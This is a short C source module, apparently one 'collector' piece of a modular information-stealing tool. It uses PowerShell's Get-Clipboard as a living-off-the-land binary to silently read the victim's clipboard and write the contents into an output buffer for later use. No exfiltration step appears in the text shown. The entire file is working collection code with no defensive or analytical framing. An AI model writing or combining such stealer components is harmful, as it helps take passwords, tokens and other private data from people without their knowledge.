// chunk: collectors/clipboard_lolbin
// depends: core/emit_buffer, core/run_cmd
// provides: collect_clipboard
// note: LOLBin clipboard via powershell Get-Clipboard

#ifndef CHUNK_CLIPBOARD_LOLBIN
#define CHUNK_CLIPBOARD_LOLBIN

static void collect_clipboard(void) {
    char buf[4096] = {0};
    DWORD buf_len = 0;
    run_cmd("powershell -NoProfile -Command \"Get-Clipboard\"", buf, sizeof(buf), &buf_len);
    if (buf_len > 0 && buf[0]) {
        emitf("=== CLIPBOARD ===\r\n");
        emitf("%.*s\r\n\r\n", (int)buf_len, buf);
    }
}

#endif
